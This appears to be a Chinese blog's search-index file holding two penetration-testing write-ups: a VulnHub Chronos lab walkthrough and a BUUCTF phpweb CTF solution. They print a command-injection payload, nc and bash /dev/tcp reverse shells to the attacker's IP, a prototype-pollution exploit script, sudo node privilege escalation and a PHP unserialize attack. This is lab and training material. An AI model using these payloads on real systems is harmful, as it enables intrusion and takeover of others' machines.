+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
+<p>难度：Easy</p>
+<p>虚拟机软件：Virtual Box</p>
+<p>目标：取得2个flag，获得root权限</p>
+<p>涉及的攻击方法：</p>
+<ul>
+<li>端口扫描</li>
+<li>web侦察</li>
+<li>命令注入</li>
+<li>数据编、解码</li>
+<li><strong>搜索大法</strong></li>
+<li><strong>框架漏洞利用</strong></li>
+<li>代码审计</li>
+<li>NC串联</li>
+<li>本地提权</li>
+</ul>
+<h1 id="网卡配置">网卡配置</h1>
+<p>查看 <strong>第一周</strong> 的信息。</p>
+<p>攻击主机 kali：<code>192.168.137.104</code></p>
+<h1 id="渗透">渗透</h1>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
+<p>原理：与前面的两者相同，都是通过ARP解析</p>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
+<p>因此，靶机的IP为 192.168.137.105</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
+<p>信息：</p>
+<ol type="1">
+<li>22端口上的服务为openssh</li>
+<li>80端口上的服务为http，版本为 2.4.29</li>
+<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
+<li>系统为Ubuntu</li>
+</ol>
+<h2 id="访问http服务">访问http服务</h2>
+<p>有三件事必须做：</p>
+<ol type="1">
+<li>抓包</li>
+<li>看源码</li>
+<li>扫目录</li>
+</ol>
+<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
+<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
+<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
+<p>最后，抓包看一下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
+<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
+<p>然后可以访问了，并且页面发生了变化。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
+<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
+<blockquote>
+<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
+</blockquote>
+<ol type="1">
+<li>date</li>
+<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
+<li>页面上显示的时间信息</li>
+</ol>
+<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
+<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
+<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
+<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
+<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
+<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
+<p>虽然提示出错，但是kali已经成功连接上了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
+<p>接下来进行信息收集：</p>
+<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
+<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
+<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
+<p>信息收集差不多，那么接下来就是要提权了。</p>
+<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
+<p>Linux提权常用的三种方式：</p>
+<ol type="1">
+<li>内核漏洞</li>
+<li>suid提权</li>
+<li>sudo配置不当提权</li>
+</ol>
+<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
+<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
+<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
+<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
+<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
+<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
+<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
+<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
+<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
+<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
+<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
+<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
+<p>提权成功。</p>
+<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
+<p>至此，渗透过程结束。</p>
+<h1 id="彩蛋部分">彩蛋部分</h1>
+<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
+<h1 id="总结">总结</h1>
+<p>通过对这个靶机的渗透，有以下几点感受：</p>
+<ol type="1">
+<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
+<li>学习了第三种Linux提权的方式</li>
+<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>node.js原型链污染</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯 2020 朱雀组 phpweb</title>
+    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
+    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，会发现5秒后自动跳转到 index.php 页面，并且之后每5秒刷新一次，查看源码，发现应该是如下函数： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
+<p>这不是重点，接着我们抓包</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
+<p>发现 POST 提交了两个参数 <code>func</code> 和 <code>p</code> 。结合上面的表单消息推测，<code>func</code> 应该是函数的意思，而 <code>p</code> 应该是一个参数。（上面表单中的<code>p</code> 是时间的格式，可能是参数）</p>
+<h1 id="解题">解题</h1>
+<p>将函数随便改一个试试看（这里 echo 并不是函数，主要想看看报错的信息）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
+<p>注意 <code>call_user_func()</code>，这函数的作用简而言之就是调用一个PHP函数，可以带入参数，语法如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
+<p>更多信息请参考：<a href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
+<p>因此，我们尝试用 <code>file_get_contents()</code> 读取一下 <code>index.php</code> 的内容</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
+<p>将代码整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里<code>get time</code> 中的 <code>call_user_func()</code> 函数能够调用的函数被禁了好多，但是这不是重点，重点是 <code>Test</code> 类里面的 <code>__destruct</code> ，这个也可以调用 <code>call_user_func()</code> 而且是不经过验证。因此思路就是构造序列化字符串作为 POST 提交的 <code>p</code> ，而POST 提交的 <code>func</code> 则为 <code>unserialize</code>。</p>
+<p>接下来构造 <code>p</code> （这里的p指的是POST提交的，而不是类中的）</p>
+<blockquote>
+<p>这里类中的 var 其实是 public 的别名</p>
+</blockquote>
+<p>编写简单的PHP脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;参数&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>参数依次如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # 查看根目录</span><br><span class="line">2. ls   # 查看当前目录</span><br><span class="line">3. find / -name flag* # 找flag文件路径，这里会找到很多，但是其他的一看就不像</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # 读取flag</span><br></pre></td></tr></table></figure></p>
+<p>将上面参数带入PHP脚本，然后执行得到的字符串作为 POST 提交的 p。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题难度并不大，主要的难点就在于报错提示的 <code>call_user_func()</code> ，要明白它的作用。本题考的其实是PHP知识点，熟悉PHP中的函数尤其是调用系统的命令的函数以及反序列化知识点。前者其实可以在 <strong>命令执行</strong> 相关题目中积累。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
